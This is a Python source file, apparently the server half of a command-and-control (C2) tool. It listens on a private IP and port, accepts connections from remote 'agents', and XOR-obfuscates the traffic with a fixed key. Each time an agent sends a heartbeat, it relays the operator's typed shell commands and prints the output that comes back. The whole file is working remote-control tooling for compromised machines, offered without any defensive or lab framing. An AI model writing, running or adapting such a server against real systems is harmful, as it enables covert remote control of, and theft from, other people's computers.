import socket
import threading
import base64

# Constants
SERVER_ADDRESS = "192.168.1.36"
SERVER_PORT = 2222
XOR_KEY = 0xAA  # Must match the XOR key used in the agent

def xor_encrypt_decrypt(data):
    return bytes([byte ^ XOR_KEY for byte in data])

def handle_agent_connection(agent_socket):
    while True:
        try:
            # Receive data from the agent
            data = agent_socket.recv(1024)
            if not data:
                break  # Connection closed

            # Decrypt received data
            decrypted_data = xor_encrypt_decrypt(data).decode("utf-8")

            # Handle heartbeat messages
            if decrypted_data == "heartbeat":
                print("Received heartbeat from agent")
                # Send a command back to the agent
                command = input("Enter command: ")
                encrypted_command = xor_encrypt_decrypt(command.encode("utf-8"))
                agent_socket.sendall(encrypted_command)
            else:
                # Handle command output from the agent
                print("Received command output from agent:")
                print(decrypted_data)
        except Exception as e:
            print(f"Error handling agent connection: {e}")
            break

    agent_socket.close()

def start_c2_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_ADDRESS, SERVER_PORT))
    server_socket.listen(5)
    print(f"C2 server listening on {SERVER_ADDRESS}:{SERVER_PORT}")

    while True:
        agent_socket, agent_address = server_socket.accept()
        print(f"Agent connected from {agent_address}")
        threading.Thread(target=handle_agent_connection, args=(agent_socket,)).start()

if __name__ == "__main__":
    start_c2_server()
